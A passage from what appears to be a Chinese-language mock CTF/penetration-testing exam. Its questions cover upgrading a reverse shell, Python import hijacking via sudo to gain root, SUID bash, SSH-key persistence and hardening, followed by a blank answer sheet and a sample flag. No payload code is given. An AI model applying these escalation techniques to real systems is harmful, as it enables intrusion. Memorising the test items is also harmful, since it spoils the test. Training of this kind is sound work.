- **第 87 題**：攻擊者利用 SSTI 成功在目標靶機上建立反彈 Shell，連回攻擊機監聽端口。請問通常應使用哪一個 Linux 指令在本地終端升級為完整 PTY 互動式 TTY Shell（支援自動補全與 Ctrl+C）？  
  【作答區】：____________________
- **第 88 題**：根據【證據 K】，使用者 `developer` 在執行 `sudo -l` 時被授與了何種特權？  
  【作答區】：____________________
- **第 89 題**：根據【證據 K】，`/opt/maintenance/cleanup.py` 腳本引入了 `import helper`，且目錄 `/opt/maintenance/` 對 `developer` 為可寫。攻擊者應採取何種提權手法以 root 身分執行任意指令？  
  【作答區】：____________________
- **第 90 題**：請寫出在 `/opt/maintenance/` 目錄下建立惡意 `helper.py` 的具體 Python 代碼內容，使其在被 sudo 執行時自動產出一個 root shell 或將 `/bin/bash` 複製並賦予 SUID。  
  【作答區】：____________________
- **第 91 題**：提權至 root 身分後，根目錄下存在檔案 `/root/root_flag.txt`，執行 `cat /root/root_flag.txt` 回顯：`flag{pwn_r00t_pr1v_3sc_c0mpl3t3}`。請記錄此 Flag。  
  【作答區（Flag）】：____________________
- **第 92 題**：為維持 root 權限的持久化（Persistence），攻擊者在 `/root/.ssh/authorized_keys` 中追加了自身的公鑰。管理員在檢查時應比對哪一個系統設定以確保只有合法金鑰能存取？  
  【作答區】：____________________
- **第 93 題**：若要加固【證據 K】中的提權弱點，管理員應對 `/opt/maintenance/` 目錄與 `sudoers` 分別執行何種權限修復？  
  【作答區】：____________________

---

## 考生實體真題作答卷 (Part 1 ~ Part 4 彙整表格)

| 題號 | 考生作答內容 | 題號 | 考生作答內容 |
| :---: | :--- | :---: | :--- |
| **01** | | **48** | |
| **02** | | **49** | |
| **03** | | **50** | |
| **04** | | **51** | |
| **05** | | **52** | |
| **06** | | **53** | |
| **07** | | **54** | |
| **08** | | **55** | |
| **09** | | **56** | |
| **10** | | **57** | |
| **11** | | **58** | |
| **12** | | **59** | |
| **13** | | **60** | |
| **14** | | **61** | |
| **15** | | **62** | |
| **16** | | **63** | |
| **17** | | **64** | |
| **18** | | **65** | |
| **19** | | **66** | |
| **20** | | **67** | |
| **21** | | **68** | |
| **22** | | **69** | |
| **23** | | **70** | |
| **24** | | **71** | |
| **25** | | **72** | |
| **26** | | **73** | |
| **27** | | **74** | |
| **28** | | **75** | |
| **29** | | **76** | |
| **30** | | **77** | |
| **31** | | **78** | |
| **32** | | **79** | |
| **33** | | **80** | |
| **34** | | **81** | |
| **35** | | **82** | |
| **36** | | **83** | |
| **37** | | **84** | |
| **38** | | **85** | |
| **39** | | **86** | |
| **40** | | **87** | |
| **41** | | **88** | |
| **42** | | **89** | |
| **43** | | **90** | |
| **44** | | **91** | |
| **45** | | **92** | |
| **46** | | **93** | |
| **47** | | - | - |

---
**作答完畢後，請隊員開啟 `mock_exam_b_lab_solutions.md` 進行逐題核對與實戰思路覆盤！**


